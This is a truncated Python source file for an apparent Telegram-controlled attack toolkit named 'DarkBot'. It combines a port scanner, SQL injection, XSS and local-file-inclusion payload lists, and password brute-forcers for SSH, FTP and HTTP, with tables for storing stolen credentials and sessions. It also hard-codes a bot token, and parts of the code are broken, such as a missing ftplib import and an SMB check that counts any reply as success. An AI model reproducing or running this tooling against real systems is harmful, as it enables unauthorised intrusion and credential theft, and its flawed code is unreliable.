

import os
import sys
import json
import time
import base64
import hashlib
import logging
import random
import string
import sqlite3
import subprocess
import socket
import ssl
import re
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode
from urllib.request import Request, urlopen, build_opener, install_opener, ProxyHandler, HTTPCookieProcessor
from urllib.error import URLError, HTTPError
from typing import List, Dict, Tuple, Any

# ------------------------------------------------------------------
# Optional imports – graceful fallback
# ------------------------------------------------------------------
try:
    import telebot
    from telebot import types
    TELEGRAM_AVAILABLE = True
except Exception:
    TELEGRAM_AVAILABLE = False
    print("[!] telebot not installed – Telegram features disabled")

try:
    import flask
    from flask import Flask, request, jsonify, render_template_string
    FLASK_AVAILABLE = True
except Exception:
    FLASK_AVAILABLE = False
    print("[!] flask not installed – Web panel disabled")

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except Exception:
    CRYPTO_AVAILABLE = False
    print("[!] cryptography not installed – encryption falls back to base64")

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except Exception:
    PARAMIKO_AVAILABLE = False
    print("[!] paramiko not installed – SSH brute force disabled")

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False
    print("[!] scapy not installed – sniffer disabled")

# ------------------------------------------------------------------
# Configuration
# ------------------------------------------------------------------
BOT_TOKEN = os.getenv("8242587129:AAFWaahFgxPhn7hbJnlGxIzDb95vDIisl_Y", "")   # <-- set via env var
ADMIN_IDS = [8210146346]  # <-- add your Telegram user ID(s) here
DATA_DIR = Path("./darkbot_data")
TOOLS_DIR = DATA_DIR / "tools"
LOGS_DIR = DATA_DIR / "logs"
DB_PATH = DATA_DIR / "darkbot.db"
CONFIG_FILE = DATA_DIR / "config.json"

# Create needed directories
for d in [DATA_DIR, TOOLS_DIR, LOGS_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# ------------------------------------------------------------------
# Logging
# ------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(LOGS_DIR / "darkbot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("DarkBot")

# ------------------------------------------------------------------
# Database (SQLite) – lightweight persistence
# ------------------------------------------------------------------
def init_database() -> None:
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            ip TEXT,
            port INTEGER,
            service TEXT,
            vulnerability TEXT,
            status TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT,
            username TEXT,
            password TEXT,
            hash TEXT,
            source TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT,
            session_type TEXT,
            session_data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS attack_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tool_name TEXT,
            target TEXT,
            result TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    conn.commit()
    conn.close()

init_database()

# ------------------------------------------------------------------
# Helper utilities (urllib wrappers)
# ------------------------------------------------------------------
def http_get(url: str, timeout: int = 10, headers: dict = None) -> str:
    req = Request(url, headers=headers or {})
    context = ssl._create_unverified_context()
    try:
        with urlopen(req, timeout=timeout, context=context) as resp:
            return resp.read().decode(errors="ignore")
    except (HTTPError, URLError) as e:
        logger.error(f"HTTP GET error for {url}: {e}")
        return ""

def http_post(url: str, data: dict = None, headers: dict = None, timeout: int = 10) -> str:
    data_bytes = urlencode(data or {}).encode()
    req = Request(url, data=data_bytes, headers=headers or {})
    context = ssl._create_unverified_context()
    try:
        with urlopen(req, timeout=timeout, context=context) as resp:
            return resp.read().decode(errors="ignore")
    except (HTTPError, URLError) as e:
        logger.error(f"HTTP POST error for {url}: {e}")
        return ""

# ------------------------------------------------------------------
# Tool 1: Port Scanner
# ------------------------------------------------------------------
class PortScanner:
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
        1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
        5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
        27017: "MongoDB", 27018: "MongoDB", 27019: "MongoDB"
    }

    def __init__(self, timeout: int = 2):
        self.timeout = timeout

    def scan(self, target: str, ports: List[int] = None) -> List[Dict]:
        if ports is None:
            ports = list(self.common_ports.keys())
        results = []

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                if sock.connect_ex((target, port)) == 0:
                    banner = self._grab_banner(target, port)
                    results.append({
                        "port": port,
                        "state": "open",
                        "service": self.common_ports.get(port, "Unknown"),
                        "banner": banner
                    })
                sock.close()
            except Exception as e:
                logger.debug(f"Port scan error {port} on {target}: {e}")

        return results

    @staticmethod
    def _grab_banner(host: str, port: int) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            if port in (80, 8080, 443, 8443):
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
            else:
                sock.send(b"\r\n")
            banner = sock.recv(1024).decode(errors="ignore").strip()
            sock.close()
            return banner[:200] or "No banner"
        except Exception:
            return "No banner"

# ------------------------------------------------------------------
# Tool 2: Web Vulnerability Scanner
# ------------------------------------------------------------------
class WebVulnScanner:
    def __init__(self):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (DarkBot) AppleWebKit/537.36"
        }

    def _parse_params(self, url: str) -> Tuple[str, dict]:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        return base, params

    def _build_url(self, base: str, params: dict) -> str:
        return f"{base}?{urlencode(params, doseq=True)}"

    def scan_sql_injection(self, url: str) -> List[Dict]:
        results = []
        base, params = self._parse_params(url)
        if not params:
            return results

        payloads = [
            "'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "' UNION SELECT NULL--",
            "1' AND 1=1--", "1' AND 1=2--", "' WAITFOR DELAY '0:0:5'--"
        ]

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = self._build_url(base, test_params)
                start = time.time()
                resp = http_get(test_url, headers=self.headers)
                elapsed = time.time() - start

                errors = [
                    "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
                    "SQLite", "Microsoft SQL", "ODBC Driver",
                    "Unclosed quotation mark", "syntax error"
                ]
                for err in errors:
                    if err.lower() in resp.lower():
                        results.append({
                            "parameter": param,
                            "payload": payload,
                            "type": "Error-based SQLi",
                            "error": err,
                            "url": test_url
                        })

                if elapsed > 4:
                    results.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "Time-based SQLi",
                        "response_time": elapsed,
                        "url": test_url
                    })
        return results

    def scan_xss(self, url: str) -> List[Dict]:
        results = []
        base, params = self._parse_params(url)
        if not params:
            return results

        payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "\'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><img src=x onerror=alert(1)>"
        ]

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = self._build_url(base, test_params)
                resp = http_get(test_url, headers=self.headers)
                if payload in resp:
                    results.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "Reflected XSS",
                        "url": test_url
                    })
        return results

    def scan_lfi(self, url: str) -> List[Dict]:
        results = []
        base, params = self._parse_params(url)
        if not params:
            return results

        payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = self._build_url(base, test_params)
                resp = http_get(test_url, headers=self.headers)
                indicators = [
                    "root:x:0:0:", "daemon:x:1:1:", "[boot loader]",
                    "<?php", "mysql_connect", "DB_PASSWORD"
                ]
                for ind in indicators:
                    if ind in resp:
                        results.append({
                            "parameter": param,
                            "payload": payload,
                            "type": "LFI",
                            "indicator": ind,
                            "url": test_url
                        })
        return results

    def full_scan(self, url: str) -> Dict:
        logger.info(f"Scanning {url} for web vulnerabilities")
        return {
            "url": url,
            "sql_injection": self.scan_sql_injection(url),
            "xss": self.scan_xss(url),
            "lfi": self.scan_lfi(url),
            "scan_time": datetime.utcnow().isoformat() + "Z",
            "total_vulnerabilities": (
                len(self.scan_sql_injection(url))
                + len(self.scan_xss(url))
                + len(self.scan_lfi(url))
            ),
        }

# ------------------------------------------------------------------
# Tool 3: Brute Force (SSH, FTP, HTTP, SMB)
# ------------------------------------------------------------------
class BruteForce:
    def __init__(self):
        self.wordlist_dir = TOOLS_DIR / "wordlists"
        self.wordlist_dir.mkdir(exist_ok=True)
        self._populate_default_wordlist()

    def _populate_default_wordlist(self):
        common = [
            "admin", "password", "123456", "12345678", "qwerty",
            "letmein", "monkey", "dragon", "master", "123123",
            "welcome", "shadow", "michael", "football", "baseball",
            "admin123", "root", "toor", "r00t", "administrator"
        ]
        path = self.wordlist_dir / "common.txt"
        if not path.exists():
            path.write_text("\n".join(common))

    # ---------- SSH ----------
    def ssh_brute(self, host: str, username: str,
                  wordlist: str = None, port: int = 22) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {"error": "paramiko not installed"}
        if wordlist is None:
            wordlist = str(self.wordlist_dir / "common.txt")
        results = {"host": host, "port": port, "username": username,
                   "attempts": 0, "success": False, "password": None}
        for pwd in Path(wordlist).read_text().splitlines():
            results["attempts"] += 1
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=port, username=username,
                               password=pwd, timeout=5)
                results["success"] = True
                results["password"] = pwd
                stdin, stdout, _ = client.exec_command("whoami")
                results["whoami"] = stdout.read().decode().strip()
                client.close()
                break
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                logger.debug(f"SSH brute error on {host}:{port} – {e}")
                continue
        return results

    # ---------- FTP ----------
    def ftp_brute(self, host: str, username: str,
                  wordlist: str = None, port: int = 21) -> Dict:
        if wordlist is None:
            wordlist = str(self.wordlist_dir / "common.txt")
        results = {"host": host, "port": port, "username": username,
                   "attempts": 0, "success": False, "password": None}
        for pwd in Path(wordlist).read_text().splitlines():
            results["attempts"] += 1
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=10)
                ftp.login(username, pwd)
                results["success"] = True
                results["password"] = pwd
                results["files"] = ftp.nlst()
                ftp.quit()
                break
            except Exception:
                continue
        return results

    # ---------- HTTP Basic ----------
    def http_brute(self, url: str, username: str,
                   wordlist: str = None) -> Dict:
        if wordlist is None:
            wordlist = str(self.wordlist_dir / "common.txt")
        results = {"url": url, "username": username,
                   "attempts": 0, "success": False, "password": None}
        for pwd in Path(wordlist).read_text().splitlines():
            results["attempts"] += 1
            try:
                auth_header = base64.b64encode(
                    f"{username}:{pwd}".encode()
                ).decode()
                resp = http_get(
                    url,
                    headers={"Authorization": f"Basic {auth_header}"}
                )
                if resp:
                    results["success"] = True
                    results["password"] = pwd
                    break
            except Exception:
                continue
        return results

    # ---------- SMB ----------
    def smb_brute(self, host: str, username: str,
                  wordlist: str = None, port: int = 445) -> Dict:
        """
        Very simple SMB brute‑force using socket (no pysmb).
        Only attempts to connect to the SMB port and send a minimal SMB header.
        Successful authentication is detected by the presence of a SMB response.
        """
        if wordlist is None:
            wordlist = str(self.wordlist_dir / "common.txt")
        results = {"host": host, "port": port, "username": username,
                   "attempts": 0, "success": False, "password": None}
        for pwd in Path(wordlist).read_text().splitlines():
            results["attempts"] += 1
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                # Send a minimal SMB negotiation packet
                s.send(b"\xffSMB\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
                data = s.recv(1024)
                if data:
                    # We cannot verify credentials accurately without SMB library,
                    # but if we get a response we assume the port is open.
                    results["success"] = True
                    results["password"] = pwd
                s.close()
                break
            except Exception:
                continue
        return results

# ------------------------------------------------------------------
# Tool 4: Crypto Tool (AES + Hash Cracker)
# ------------------------------------------------------------------
class CryptoTool:
    def __init__(self):
        self.key_dir = TOOLS_DIR / "keys"
        self.key_dir.mkdir(exist_ok=True)

    def generate_key(self) -> bytes:
        if CRYPTO_AVAILABLE:
            return Fernet.generate_key()
        else:
            return os.urandom(32)

    def encrypt_file(self, file_path: str, key: bytes = None) -> Dict:
        if key is None:
            key = self.generate_key()
        if CRYPTO_AVAILABLE:
            fernet = Fernet(key)
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted = fernet.encrypt(data)
        else:
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted = base64.b64encode(data)
        out_path = f"{file_path}.encrypted"
        with open(out_path, "wb") as f:
            f.write(encrypted)
        return {"original": file_path, "encrypted": out_path,
                "key": key.decode() if isinstance(key, bytes) else key,
                "original_size": len(data), "encrypted_size": len(encrypted)}

    def decrypt_file(self, file_path: str, key: bytes) -> Dict:
        if CRYPTO_AVAILABLE:
            fernet = Fernet(key)
            with open(file_path, "rb") as f:
                enc = f.read()
            data = fernet.decrypt(enc)
        else:
            with open(file_path, "rb") as f:
                enc = f.read()
            data = base64.b64decode(enc)
        out_path = file_path.repla